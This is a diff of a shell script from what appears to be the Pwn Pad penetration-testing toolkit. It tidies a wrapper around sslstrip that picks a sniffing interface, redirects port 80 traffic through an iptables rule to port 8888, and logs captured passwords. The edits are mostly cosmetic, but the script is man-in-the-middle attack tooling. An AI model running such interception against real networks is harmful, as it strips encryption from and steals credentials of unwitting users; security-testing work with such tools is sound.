@@ -6,18 +6,14 @@ trap f_clean_up KILL
 
 ##################################################
 f_identify_device(){
-  # Function to determine whether current device is new pad or old pad
-  # Checking to see if this is the old pad or the new pad:
-  cat /proc/cpuinfo |grep grouper &> /dev/null
-  pad_old_or_new=`echo $?`
 
-  # If pad_old_or_new = 1 then current device is New Pad
-  if [ $pad_old_or_new -eq 1 ]; then
-
-    # New Pad's GSM interface is rmnet_usb0
+# Check device
+  hardw=`getprop ro.hardware`
+  if [[ "$hardw" == "deb" || "$hardw" == "flo" ]]; then
+    # Set interface for new Pwn Pad
     gsm_int="rmnet_usb0"
-    else
-    # Old Pad's GSM interface is rmnet0
+  else
+    # Set interface for Pwn Phone and old Pwn Pad
     gsm_int="rmnet0"
   fi
 }
@@ -26,25 +22,25 @@ f_identify_device(){
 # Cleanup function to ensure sslstrip stops and iptable rules stop
 f_clean_up(){
   echo
-  echo "[!] Killing any instances of sslstrip and flushing iptables"
+  echo "[!] Killing other instances of sslstrip and flushing iptables"
   echo
   killall sslstrip
 
-  # Remove SSL Strip itables rule ONLY
+  # Remove SSL Strip iptables rule ONLY
   iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8888
 }
 
 ##################################################
 f_interface(){
   clear
-  echo "Select which interface you would like to sniff on? (1-6):"
+  echo "Select which interface to sniff on (1-6):"
   echo
-  echo "1. eth0  (USB ethernet adapter)"
-  echo "2. wlan0  (Internal Nexus Wifi)"
-  echo "3. wlan1  (USB TPlink Atheros)"
+  echo "1. eth0  (USB Ethernet adapter)"
+  echo "2. wlan0  (internal Wifi)"
+  echo "3. wlan1  (USB TP-Link adapter)"
   echo "4. mon0  (monitor mode interface)"
   echo "5. at0  (Use with EvilAP)"
-  echo "6. $gsm_int (Internal 3G GSM)"
+  echo "6. $gsm_int (4G GSM connection)"
   echo
 
   read -p "Choice: " interfacechoice
@@ -61,16 +57,16 @@ esac
 }
 
 
-#Setup IPtables for ssltrip
+# Setup iptables for sslstrip
 f_ip_tables(){
   iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8888
 }
 
 f_run(){
-  #Path to sslstrip definitions:
+  # Path to sslstrip definitions
   clear
   echo
-  echo  "Logging to /opt/pwnix/captures/passwords/"
+  echo "Logs saved to /opt/pwnix/captures/passwords/"
   echo
   sleep 2
 
